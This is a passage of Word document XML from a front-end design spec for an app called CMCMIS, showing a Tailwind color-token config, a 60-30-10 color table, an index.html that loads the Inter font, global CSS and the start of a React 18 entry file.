            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    extend: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      colors: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        base:   { DEFAULT: '#F5F6FA', elev: '#EEF1F7' },   // 60% — page + cards</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ink:    { DEFAULT: '#2F3545', soft: '#4B5563' },   // 30% — text</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        border: '#E5E7EB',                                 // 30% — hairlines</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        accent: { DEFAULT: '#4F5DFF', hover: '#5B6CFF' },  // 10% — CTAs + focus</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        success: '#4CAF50',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        warning: '#F59E0B',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        danger:  '#EF4444',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        badge:   '#8B5CF6',</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fontFamily: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        sans: ['Inter','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],</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boxShadow: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        card: '0 1px 2px 0 rgb(15 23 42 / 0.04), 0 1px 1px 0 rgb(15 23 42 / 0.03)',</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plugins: [forms],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>};</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Color tokens — the 60-30-10 distribution</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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Role (60/30/10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>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Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>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Hex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>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Used for</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>60% neutral</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>base</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#F5F6FA</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Page background, sidebar fill</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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60% neutral</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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base-elev</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#EEF1F7</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Cards, hover surfaces</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>30% text</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ink</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#2F3545</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Body text, headings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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30% text</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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ink-soft</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#4B5563</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Captions, table headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>30% hairline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>border</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#E5E7EB</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Input borders, dividers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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10% accent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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accent</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#4F5DFF</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Primary CTA, active nav, focus ring</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>10% accent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>accent-hover</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#5B6CFF</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Hover state of accent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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success</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#4CAF50</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OK badges, active dots</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>warning</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#F59E0B</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Soft alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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danger</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#EF4444</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Error banners, 403 page icon</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>badge</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#8B5CF6</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Role pill (SUPER_ADMIN, NORMAL_USER, …)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.5  index.html — Title + Inter Font</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index.html</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;!doctype html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;html lang="en"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;meta charset="UTF-8" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;meta name="theme-color" content="#F5F6FA" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;link rel="preconnect" href="https://fonts.googleapis.com" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          rel="stylesheet" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;title&gt;CMCMIS · Sign In&lt;/title&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;div id="root"&gt;&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;script type="module" src="/src/main.jsx"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.6  styles/globals.css — Tailwind Directives + Base Layer</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src/styles/globals.css</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>@tailwind base;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>@tailwind components;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>@tailwind utilities;</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@layer base {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  html, body, #root { height: 100%; }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  body {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    @apply bg-base text-ink font-sans antialiased;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    font-variant-numeric: tabular-nums;</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*:focus-visible {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    @apply outline-none ring-2 ring-accent ring-offset-2 ring-offset-base;</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.7  main.jsx — React 18 Mount</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src/main.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import React from 'react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import ReactDOM from 'react-dom/client';</w:t>
